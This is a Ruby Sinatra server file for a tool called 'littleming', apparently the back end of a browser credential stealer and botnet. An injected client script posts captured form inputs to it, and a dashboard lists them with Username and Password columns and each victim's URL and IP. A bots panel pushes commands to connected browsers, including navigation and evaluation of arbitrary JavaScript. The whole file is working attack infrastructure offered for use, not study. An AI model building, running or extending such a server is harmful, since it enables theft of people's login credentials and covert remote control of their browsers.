# server.rb
require 'rubygems'
require 'bundler/setup'

require 'sinatra'
require 'sequel'
require 'json'
require 'slim'

DB = Sequel.connect("sqlite://db/#{settings.environment}.db")

Sequel::Model.plugin :json_serializer

class Record < Sequel::Model
  def before_save
    self.recorded_at ||= Time.now
    super
  end

  def self.record(data=nil, user_agent=nil, ip=nil)
    record = new
    record.ip = ip
    record.user_agent = user_agent
    record.from_url = data.delete('from_url')
    record.user_inputs = data.to_json
    record.save
  end

  def to_json(*options)
    {id: id, ip: ip, fromUrl: from_url, userAgent: user_agent, userInputs: user_inputs, recordedAt: recorded_at.to_i}.to_json
  end
end

connections = []

helpers do
  def protected!
    return if authenticated?
    headers 'WWW-Authenticate' => 'Basic realm="Restricted Area"'
    halt 401, (slim "p 401 Not authenticated")
  end

  def authenticated?
    @auth ||=  Rack::Auth::Basic::Request.new(request.env)
    @auth.provided? and @auth.basic? and @auth.credentials and @auth.credentials == ['littleming', 'littleming']
  end
end

not_found do
  slim "p 404 Not found"
end

configure do
  # disable Rack::Protection::HttpOrigin for CORS
  set :protection, :except => :http_origin
end

# setup CORS
['/records', '/listen/commands'].each do |path|
  before path do
    # CORS headers
    headers 'Access-Control-Allow-Origin' => '*'

    # if request is preflighted with http options
    if request.request_method == 'OPTIONS'
      headers 'Access-Control-Allow-Methods' => 'GET, POST, PUT, DELETE'
      headers 'Access-Control-Allow-Headers' => 'accept, content-type, origin'
      halt 200
    end
  end
end

# the app
get '/' do
  protected!

  slim :index
end

# get all records
get '/records' do
  protected!

  content_type :json
  Record.reverse_order(:id).to_json
end

# CORS for injected client to post data
post '/records' do
  # request content type should be json
  pass unless request.media_type == 'application/json'

  record = Record.record(JSON.parse(request.body.read), request.user_agent, request.ip)

  # send newRecord event to subscribed clients

  # purge dead connections
  connections.reject!(&:closed?)

  connections.each do |out|
    out << "event: newRecord" << "\n" << "data: #{record.to_json}" << "\n\n"

    # indicate client to connect again
    out.close
  end
end

# delete a record
delete '/records/:id' do
  protected!

  content_type :text
  record = Record[params[:id]]
  if record.nil?
    'does not exist'
  else
    record.destroy ? 'deleted' : 'failed'
  end
end

# subscribe to newly posted records
get '/listen/records', provides: 'text/event-stream' do
  protected!

  cache_control :no_cache
  headers 'Connection' => 'keep-alive'

  stream(:keep_open) do |out|
    out << "data: subscribed" << "\n\n"

    # store the connection
    connections << out
    logger.info 'we have a new connection'
  end
end

class Bot
  attr_reader :connection, :ip, :location
  def initialize(connection, ip, location)
    @connection = connection
    @ip = ip
    @location = location
  end
end

bots = []

# app to control the bots
get '/bots' do
  protected!

  slim :bots, locals: {bots: bots}
end

post '/bots/command' do
  protected!

  event = params[:event]
  data = params[:data]

  # purge dead bots
  bots.reject! { |bot| bot.connection.closed? }

  connected_bots = bots.size

  bots.each do |bot|
    bot.connection << "event: #{event}" << "\n" << "data: #{data}" << "\n\n"

    # some anti-virus software treat an SSE connection as a download and
    # do not release it to the browser until the connection is closed
    # see http://stackoverflow.com/a/13135995 for details
    # close the connection and indicate client to connect again
    bot.connection.close
  end

  "Command #{event} sent to #{connected_bots} bot(s)"
end

get '/listen/commands', provides: 'text/event-stream' do
  cache_control :no_cache
  headers 'Connection' => 'keep-alive'

  stream(:keep_open) do |out|
    out << "data: subscribed" << "\n\n"

    bots << bot = Bot.new(out, request.ip, params['location'])

    # remove connection when closed
    out.callback do
      bots.delete(bot)
    end

    logger.info 'we have a new bot'
  end
end

# get the javascript client
get '/client' do
  send_file 'client/client.user.js', :disposition => :attachment
end

__END__

@@ layout
doctype html
html
  head
    meta charset="utf-8"
    meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"
    title littleming
    link href="/stylesheets/bootstrap.css" rel="stylesheet" type="text/css"
  body
    .navbar.navbar-default.navbar-static-top
      .container
        .navbar-header
          button.navbar-toggle
            span.icon-bar
            span.icon-bar
            span.icon-bar
          a.navbar-brand href="/" littleming
        .collapse.navbar-collapse
          ul.nav.navbar-nav
            li
              a href="/" Records
            li
              a href="/bots" Bots
          form.navbar-form.navbar-left action="/search"
            .form-group
              input.form-control type="text" name="keyword" placeholder="Search"
          ul.nav.navbar-nav.navbar-right
            li
              a href="/client" Get the client
    .container
      == yield
    - if settings.production?
      script src="/javascripts/application.js" type="text/javascript"
    - else
      script src="/javascripts/underscore.js" type="text/javascript"
      script src="/javascripts/utils.js" type="text/javascript"
      script src="/javascripts/knockout.js" type="text/javascript"
      script src="/javascripts/date.extensions.js" type="text/javascript"
      script src="/javascripts/ua-parser.js" type="text/javascript"
      script src="/javascripts/records.js" type="text/javascript"
      script src="/javascripts/bots.js" type="text/javascript"
      script src="/javascripts/ui.js" type="text/javascript"

@@ index
#record-detail-panel data-bind="if: isSet()"
  .panel.panel-default
    .panel-body
      p data-bind="text: '#'+record().id"
      p data-bind="text: record().userAgent"
      p data-bind="text: record().userInputs"
.panel.panel-default.table-responsive
  table.table.table-hover#records-table
    thead
      tr
        th.hidden #
        th Username
        th Password
        th From URL
        th IP
        th Age
        th Actions
    tbody data-bind="foreach: { data: records, afterAdd: showRecord }, visible: records().length > 0"
      tr
        td.hidden data-bind="text: id"
        td data-bind="text: getUsername()"
        td data-bind="text: getPassword()"
        td data-bind="text: getHostname()"
        td data-bind="text: ip"
        td data-bind="text: getAge()"
        td
          button.btn.btn-default.btn-xs> type="button" data-bind="click: $root.showDetails" Details
          button.btn.btn-danger.btn-xs type="button" data-bind="click: $root.removeRecord" Remove

@@ bots
.panel.panel-default.table-responsive
  table.table.table-hover
    thead
      tr
        th IP
        th Visiting
    tbody
      - bots.each do |bot|
        tr
          td= bot.ip
          td= bot.location
.panel.panel-default#control-panel
  .panel-heading Control Panel
  ul.list-group
    li.list-group-item
      button.btn.btn-default#back> Back
      button.btn.btn-default#forward> Forward
      button.btn.btn-danger#disconnect Disconnect
    li.list-group-item
      .row
        .col-xs-9
          input.form-control> type="text" placeholder="Type URL"
        button.btn.btn-default#goto Go to
    li.list-group-item
      .row
        .col-xs-9
          input.form-control> type="text" placeholder="Type command"
        button.btn.btn-default#eval Eval
